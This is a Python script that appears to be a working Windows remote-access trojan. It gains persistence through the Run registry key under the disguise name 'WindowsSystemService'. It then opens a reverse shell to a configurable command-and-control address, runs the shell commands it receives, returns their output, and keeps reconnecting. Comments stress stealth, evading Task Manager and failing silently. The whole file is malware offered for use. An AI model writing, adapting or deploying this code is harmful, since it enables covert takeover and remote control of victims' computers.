import socket
import subprocess
import os
import sys
import winreg
import time

# --- CONFIGURATION ---
# IMPORTANT: Change this to the IPv4 address of your Host machine
C2_IP = '127.0.0.1' 
C2_PORT = 4444

def establish_persistence():
    """
    DEMAND 1: Persistence.
    Writes the script location to the Windows Registry 'Run' key so it survives reboots.
    """
    try:
        # Get the absolute path of this running script
        path = os.path.abspath(sys.argv[0])
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        # Professional-sounding alias to avoid suspicion in Task Manager
        app_name = "WindowsSystemService" 

        # Open the Registry Key and set the value
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except Exception:
        pass # Fail silently to maintain stealth

def execute_remote_access():
    """
    DEMAND 3 & 4: Connection & Power.
    Opens the Reverse Shell and executes incoming commands from the C2.
    """
    while True:
        try:
            # Create a TCP socket and connect to the Attacker
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            
            while True:
                # Receive the command from your C2
                command = s.recv(1024).decode()
                
                if command.lower() == "exit":
                    s.close()
                    return
                
                # Execute the command in the OS shell hidden from the user
                process = subprocess.Popen(command, shell=True, 
                                          stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE, 
                                          stdin=subprocess.PIPE)
                
                # Capture the result (stdout or error) and send it back
                output = process.stdout.read() + process.stderr.read()
                s.send(output if output else b"Command Executed Successfully.")
        except Exception:
            # If the C2 is offline, wait 10 seconds and try to reconnect (Resilience)
            time.sleep(10)

if __name__ == "__main__":
    # 1. First, anchor into the system registry
    establish_persistence()
    # 2. Start the remote access loop
    execute_remote_access()